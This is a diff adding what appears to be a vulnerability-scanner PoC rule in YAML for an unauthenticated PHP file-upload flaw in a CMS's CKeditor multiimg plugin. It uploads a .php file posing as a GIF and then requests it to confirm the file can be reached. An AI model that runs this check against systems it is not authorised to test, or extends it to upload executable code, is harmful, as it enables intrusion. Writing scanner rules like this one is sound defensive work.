@@ -1,0 +1,28 @@
+name: poc-yaml-shiziyu-cms-ckeditor-upload-rce
+set:
+  content: randomLowercase(8)
+  randname: randomLowercase(4)
+rules:
+    - method: POST
+      path: /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php
+      headers:
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+      body: |
+        ------WebKitFormBoundary8UaANmWAgM4BqBSs
+        Content-Disposition: form-data; name="files"; filename="{{randname}}.php"
+        Content-Type: image/gif
+
+        {{content}}
+        ------WebKitFormBoundary8UaANmWAgM4BqBSs—
+      search:
+        image/uploads/(?P<path>.+?).php
+      expression:
+        response.status == 200 && response.body.bcontains(b"image/uploads/")
+    - method: GET
+      path: /Common/image/uploads/{{path}}.php
+      expression:
+        response.status == 200
+detail:
+    author: Sakura404x
+    links:
+        - https://www.linuxlz.com/aqld/2251.html
